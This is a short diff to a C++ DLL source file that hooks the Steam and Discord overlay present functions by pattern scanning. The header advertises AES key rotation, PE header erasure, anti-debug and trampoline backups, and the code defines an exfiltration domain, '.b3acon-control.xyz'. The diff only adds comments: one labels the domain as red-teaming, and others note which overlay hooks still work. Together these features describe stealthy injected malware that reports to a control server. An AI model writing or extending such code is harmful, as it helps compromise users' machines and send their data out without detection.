@@ -2,7 +2,7 @@
 // Features: AES key rotation, PE header erasure, integrity validation, anti-debug, Steam+Discord hook fallback, trampoline backup
 
 #define _CRT_SECURE_NO_WARNINGS
-#define EXFIL_DOMAIN ".b3acon-control.xyz"
+#define EXFIL_DOMAIN ".b3acon-control.xyz" // not used for game overlays. red teaming stuff
 
 #include "pch.h"
 #include <Windows.h>
@@ -131,7 +131,7 @@ void RotateAESKey() {
 
 DWORD WINAPI MainThread(LPVOID lpReserved) {
     Log("MainThread executing");
-    HMODULE hSteam = GetModuleHandleA("GameOverlayRenderer64.dll");
+    HMODULE hSteam = GetModuleHandleA("GameOverlayRenderer64.dll"); //Steam overlay working as of 27/03/2025
     if (hSteam) {
         uintptr_t present = FindPattern("GameOverlayRenderer64.dll", "48 89 5C 24 ? 48 89 6C 24 ? 48 89 74 24 ? 57 41 56 41 57 48 83 EC ? 41 8B E8");
         uintptr_t createHook = FindPattern("GameOverlayRenderer64.dll", "48 89 5C 24 ? 57 48 83 EC ? 33 C0 48 89 44 24");
@@ -147,7 +147,7 @@ DWORD WINAPI MainThread(LPVOID lpReserved) {
         }
     }
 
-    HMODULE hDiscord = GetModuleHandleA("DiscordHook64.dll");
+    HMODULE hDiscord = GetModuleHandleA("DiscordHook64.dll"); // No longer used something has chnaged in how the discord overlay is loaded
     if (hDiscord) {
         Log("Trying Discord fallback");
         uint64_t addr = (uint64_t)hDiscord + 0x1070E0;
